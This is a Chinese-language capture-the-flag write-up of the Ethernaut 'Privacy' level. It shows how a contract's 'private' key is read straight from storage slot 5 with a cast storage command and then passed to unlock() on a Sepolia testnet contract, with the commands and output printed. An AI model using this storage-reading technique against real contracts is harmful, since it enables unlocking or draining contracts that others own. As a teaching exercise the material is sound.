# Privacy 访问私有变量

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0x58c1F98c7719F8429008446123bBAad4Fc1a4254
contract Privacy {
    bool public locked = true; //0
    uint256 public ID = block.timestamp;//1
    uint8 private flattening = 10; //2
    uint8 private denomination = 255; //2
    uint16 private awkwardness = uint16(block.timestamp); //2
    bytes32[3] private data; //3

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}

```

先读槽 data在5槽，因为bytes32已经是定长数组，无论前两个位置怎么样，data就在第三个位置，也就是5槽

```solidity
cast storage 0x58c1F98c7719F8429008446123bBAad4Fc1a4254 5 --rpc-url $SEPOLIA_RPC
```

得到`0x4bc3acbb43539591ab2f28f1bb56c47bebc5330809c21a82885830ccd350ad5b`这是bytes32类型的

然后合约中要求参数是bytes16，那就是数前32个，`cast send`调用`unlocked()`函数

```solidity
cast send 0x58c1F98c7719F8429008446123bBAad4Fc1a4254 "unlock(bytes16)" 0x4bc3acbb43539591ab2f28f1bb56c47b --rpc-url $SEPOLIA_RPC --private-key $PRIVATE_KEY
```

输出中看到`to                   0x58c1F98c7719F8429008446123bBAad4Fc1a4254`就可以了


> 更新: 2025-07-09 21:01:28  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/urngrvsv3rtnpeah>